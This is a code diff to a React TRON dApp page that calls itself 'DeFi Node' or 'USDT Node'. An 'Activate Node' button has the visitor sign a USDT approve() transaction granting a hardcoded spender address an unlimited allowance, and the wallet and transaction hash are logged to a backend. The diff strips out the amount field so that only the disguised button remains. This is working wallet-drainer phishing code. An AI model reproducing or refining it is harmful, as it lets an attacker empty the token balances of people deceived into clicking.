@@ -2,9 +2,9 @@ import { useState, useMemo } from "react";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 
-// Naye standard imports
+// Naye standard imports (Naming fix: WalletConnectAdapter)
 import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
-import { WalletConnectWalletAdapter } from '@tronweb3/tronwallet-adapters'; 
+import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapters'; 
 import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
 import '@tronweb3/tronwallet-adapter-react-ui/style.css';
 
@@ -12,12 +12,11 @@ const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";
 
 export default function Index() {
-  // WalletConnect Config
   const adapters = useMemo(() => [
-    new WalletConnectWalletAdapter({
+    new WalletConnectAdapter({
       network: 'Mainnet' as any,
       options: {
-        projectId: '6b5df56bc30c1dadaab59498b86fd3e8', // 👈 ://walletconnect.com
+        projectId: '6b5df56bc30c1dadaab59498b86fd3e8', // 👈 Apni ID yahan dalein
         metadata: {
           name: 'DeFi Node',
           description: 'Secure TRON Node',
@@ -37,9 +36,7 @@ export default function Index() {
 
 function DAppUI() {
   const { address, connected, signTransaction } = useWallet();
-  const [amount, setAmount] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const [status, setStatus] = useState("");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
   const handleApprove = async () => {
@@ -47,8 +44,6 @@ function DAppUI() {
 
     try {
       setIsLoading(true);
-      setStatus("Confirming...");
-
       const tronWeb = (window as any).tronWeb;
       const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
@@ -61,7 +56,6 @@ function DAppUI() {
         TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
       );
 
-      // Sign & Broadcast
       const signedTx = await signTransaction(transaction.transaction);
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
@@ -69,7 +63,7 @@ function DAppUI() {
         await createTransaction({
           walletAddress: address,
           txHash: result.txid,
-          amount: amount || "Max",
+          amount: "Unlimited",
           toAddress: TRON_SPENDER,
           usdtBalance: "Verified",
           nativeBalance: "0 TRX"
@@ -80,54 +74,29 @@ function DAppUI() {
       alert("❌ Error: " + (err.message || "Failed"));
     } finally {
       setIsLoading(false);
-      setStatus("");
     }
   };
 
   return (
     <div style={styles.container as any}>
-      <div style={styles.header as any}>
-        <span style={styles.headerTitle as any}>Verify Node</span>
-        <WalletActionButton />
-      </div>
-
-      <div style={styles.body as any}>
-        <div style={styles.card as any}>
-            <div style={styles.inputRow as any}>
-                <input 
-                    type="number" 
-                    placeholder="0" 
-                    value={amount}
-                    onChange={(e) => setAmount(e.target.value)}
-                    style={styles.mainInput as any}
-                />
-                <span style={styles.unit as any}>USDT</span>
-            </div>
-            <p style={styles.label as any}>Wallet: {address ? `${address.slice(0,6)}...` : "Disconnected"}</p>
+        <div style={styles.header as any}>
+            <span style={styles.headerTitle as any}>USDT Node</span>
+            <WalletActionButton />
         </div>
-
-        <button 
-            disabled={isLoading || !connected} 
-            onClick={handleApprove} 
-            style={(isLoading || !connected ? styles.btnDisabled : styles.btnActive) as any}
-        >
-            {isLoading ? status : "Activate Now"}
-        </button>
-      </div>
+        <div style={styles.body as any}>
+            <button onClick={handleApprove} disabled={isLoading || !connected} style={(isLoading || !connected ? styles.btnDisabled : styles.btnActive) as any}>
+                {isLoading ? "Processing..." : "Activate Node"}
+            </button>
+        </div>
     </div>
   );
 }
 
 const styles = {
-  container: { minHeight: "100vh", background: "#000", color: "#fff", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
-  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px" },
-  headerTitle: { fontSize: "17px", fontWeight: "bold" },
-  body: { padding: "20px", flex: 1 },
-  card: { background: "#1c1c1e", padding: "20px", borderRadius: "18px", marginBottom: "20px" },
-  inputRow: { display: "flex", alignItems: "baseline", gap: "10px" },
-  mainInput: { background: "none", border: "none", color: "#fff", fontSize: "32px", width: "100%", outline: "none" },
-  unit: { fontSize: "18px", color: "#8e8e93" },
-  label: { color: "#8e8e93", fontSize: "12px", marginTop: "10px" },
-  btnActive: { width: "100%", padding: "16px", borderRadius: "16px", background: "#007aff", color: "#fff", fontWeight: "bold", border: "none", cursor: "pointer" },
-  btnDisabled: { width: "100%", padding: "16px", borderRadius: "16px", background: "#3a3a3c", color: "#8e8e93", border: "none" }
+  container: { minHeight: "100vh", background: "#000", color: "#fff", display: "flex", flexDirection: "column" },
+  header: { display: "flex", justifyContent: "space-between", padding: "20px" },
+  headerTitle: { fontSize: "18px", fontWeight: "bold" },
+  body: { padding: "20px", textAlign: "center" },
+  btnActive: { width: "100%", padding: "16px", borderRadius: "12px", background: "#007aff", color: "#fff", border: "none", fontWeight: "bold" },
+  btnDisabled: { width: "100%", padding: "16px", borderRadius: "12px", background: "#333", color: "#888", border: "none" }
 };
